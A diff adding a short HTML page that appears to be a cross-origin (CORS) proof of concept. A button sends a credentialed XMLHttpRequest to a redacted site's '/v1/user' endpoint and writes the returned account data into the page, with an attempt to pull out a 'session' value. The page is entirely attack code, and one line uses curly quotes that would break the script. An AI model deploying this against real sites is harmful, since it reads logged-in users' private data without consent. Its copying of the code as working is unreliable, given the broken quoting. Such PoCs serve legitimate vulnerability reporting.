@@ -1,0 +1,27 @@
+<html>
+<body>
+<button type='button' onclick='cors()'>xxx</button>
+<p id='demo'></p>
+<p id='session'></p>
+<script>
+function cors() {
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+document.getElementById("demo").innerHTML = this.responseText;
+parsed = JSON.stringify(this.responseText);
+var arr = [];
+ for(var x in parsed){
+ arr.push(parsed[x]);
+ }
+ console.log(arr)
+ document.getElementById(‘session’).innerHTML = arr[13];
+}
+};
+xhttp.open("GET", "https://connect.redacted.com/v1/user", true);
+xhttp.withCredentials = true;
+xhttp.send();
+}
+</script>
+</body>
+</html>
